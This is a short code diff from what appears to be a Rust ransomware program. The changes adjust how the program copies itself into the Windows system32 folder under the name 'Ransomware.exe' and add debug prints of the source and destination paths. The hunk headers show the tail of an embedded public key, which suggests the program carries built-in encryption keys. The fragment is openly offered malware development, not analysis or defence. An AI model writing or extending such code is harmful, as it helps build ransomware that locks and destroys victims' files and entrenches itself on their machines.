@@ -208,8 +208,7 @@ SwIDAQAB
 
     // let dest_dir = Path::new(r"Windows\system32\ransomware.exe");
     let mut dest_dir = get_system32_path();
-    dest_dir.push("ransomware.exe");
-
+    dest_dir.push(r"\Ransomware.exe");
 
 
     let current_exe_path = match std::env::current_exe() {
@@ -221,6 +220,10 @@ SwIDAQAB
     };
 
 
+    println!("Path exec : {:?}", current_exe_path.to_str());
+    println!("Path dest : {:?}", dest_dir);
+
+    
     let mut input = String::new();
     
     io::stdin().read_line(&mut input)
